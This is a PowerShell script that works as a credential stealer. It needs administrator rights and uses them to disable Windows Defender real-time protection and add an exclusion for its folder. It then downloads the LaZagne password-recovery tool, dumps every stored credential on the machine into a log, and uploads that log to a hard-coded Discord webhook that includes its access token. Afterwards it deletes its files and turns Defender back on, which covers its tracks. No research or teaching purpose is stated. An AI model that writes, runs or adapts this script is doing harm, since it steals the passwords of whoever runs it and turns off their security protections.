# Check if running as Administrator
$IsAdmin = [Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Define variables
$webhook = "https://discord.com/api/webhooks/1237789574537810121/W_2CZivcnqxnt2gJuBj1eTf9w_8J7Wqvqs2pdjafWCXF4Yfu7w-DWjhRCW1Aaq0LQ7tn"
$version = "2.4.6"
$tempDir = "$env:TEMP\LaZagne"
$logFile = "$tempDir\output.txt"
$downloadUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v$version/LaZagne.exe"
$laZagnePath = "$tempDir\LaZagne.exe"

# Function to disable Windows Defender real-time protection
function Disable-WindowsDefender {
    Write-Host "Disabling Windows Defender..."
    Set-MpPreference -DisableRealtimeMonitoring $true
    Add-MpPreference -ExclusionPath $tempDir
}

# Function to enable Windows Defender real-time protection
function Enable-WindowsDefender {
    Write-Host "Re-enabling Windows Defender..."
    Set-MpPreference -DisableRealtimeMonitoring $false
    Remove-MpPreference -ExclusionPath $tempDir
}

# Check if admin and disable Defender
if ($IsAdmin) {
    Disable-WindowsDefender
} else {
    Write-Host "Administrator privileges are required to disable Windows Defender."
    exit
}

# Create the temp directory if it does not exist
if (-not (Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir
}

# Download LaZagne.exe
Invoke-WebRequest -Uri $downloadUrl -OutFile $laZagnePath

# Run LaZagne and save the output to the log file
& $laZagnePath all > $logFile

# Send the log file to the Discord webhook
$payload = @{
    username = "$env:COMPUTERNAME"
    content = "New File Uploaded! (Admin: $IsAdmin)"
}
Invoke-RestMethod -Uri $webhook -Method Post -Form @{ "payload_json" = $payload | ConvertTo-Json; "file" = Get-Item $logFile }

# Clean up: Remove the temp directory and its contents
Remove-Item -Path $tempDir -Recurse -Force

# Re-enable Windows Defender after execution
Enable-WindowsDefender
